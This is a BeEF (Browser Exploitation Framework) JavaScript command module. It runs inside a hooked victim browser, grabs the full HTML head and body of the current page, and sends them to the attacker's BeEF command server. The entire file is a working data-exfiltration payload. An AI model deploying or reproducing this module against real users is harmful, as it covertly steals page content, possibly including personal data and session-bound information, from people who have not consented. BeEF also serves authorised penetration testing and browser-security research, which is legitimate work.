//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var head = beef.browser.getPageHead();
	var body = beef.browser.getPageBody();
	var mod_data = 'head=' + head + '&body=' + body;
	beef.net.send("<%= @command_url %>", <%= @command_id %>, mod_data, beef.status.success());
	return [beef.status.success(), mod_data];
});

